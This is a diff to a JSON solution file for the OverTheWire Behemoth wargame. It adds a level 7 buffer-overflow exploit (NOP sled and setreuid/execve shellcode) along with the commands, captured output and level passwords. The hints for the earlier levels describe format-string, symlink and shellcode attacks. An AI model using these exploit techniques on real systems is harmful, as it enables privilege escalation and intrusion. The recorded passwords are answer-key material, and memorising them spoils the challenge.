@@ -6,7 +6,8 @@
   "3": "Exploit behemoth3's printf(buf) format string to hijack puts() into stack shellcode.",
   "4": "behemoth4 prints the file /tmp/<its pid> - predict the pid and pre-plant a symlink to the password file.",
   "5": "behemoth5 UDP-sends the next password to localhost:1337 - be there to receive it.",
-  "6": "Feed behemoth6_reader a shellcode.txt (no 0x0b bytes allowed) that prints HelloKitty."
+  "6": "Feed behemoth6_reader a shellcode.txt (no 0x0b bytes allowed) that prints HelloKitty.",
+  "7": "behemoth7 checks argv[1] is alpha/space - but only the first 512 chars; its strcpy buffer is 524. Overflow past the checked prefix."
  },
  "host": "behemoth.labs.overthewire.org",
  "levels": [
@@ -121,6 +122,23 @@
    ],
    "pw": "aHHctqVRgi",
    "user": "behemoth6"
+  },
+  {
+   "cmds": [
+    [
+     "# validator bails after 512 checked chars; buffer is 524 -> EIP at offset 528 is unchecked",
+     "python3 exp7g.py  # argv[1] = 512*'A' + 16*'B' + p32(buf+732) + 400 NOPs + shellcode(setreuid(13008,13008), execve /bin/sh), env={}",
+     "id",
+     "cat /etc/behemoth_pass/behemoth8"
+    ]
+   ],
+   "lvl": 7,
+   "out": [
+    "uid=13008(behemoth8) gid=13007(behemoth7)",
+    "L3WIFhR0LW"
+   ],
+   "pw": "L3WIFhR0LW",
+   "user": "behemoth7"
   }
  ],
  "title": "Behemoth"
